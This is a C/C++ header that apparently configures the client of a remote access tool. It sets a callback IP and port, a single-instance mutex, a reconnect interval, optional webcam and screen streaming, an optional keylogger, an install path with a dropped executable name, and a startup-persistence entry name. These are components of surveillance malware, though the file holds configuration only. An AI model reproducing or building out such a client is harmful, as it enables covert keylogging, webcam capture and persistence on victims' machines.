#pragma once

#define IP "127.0.0.1"

#define PORT 3055

#define TAG_NAME "Client"

#define MUTEX "2f3dc5e1-18f0-4167-baf1-ddb47cb8d346"

#define TIMING_RETRY 10000

//#define WEBCAM "WLogs"

#ifdef WEBCAM

#include "webcam/WebcamManager.h"
#include "screen/ScreenStreamer.h"

#endif

//#define KEYLOGGER "KLogs"

#ifdef KEYLOGGER

#include "Keylogger/KeyLogger.h"

#endif

#define INSTALL_PATH 2

#define SUBDIRECTORY_NAME "Client"

#define SUBDIRECTORY_FILE_NAME "client.exe"

#define STARTUP_NAME "ClientStartUp"

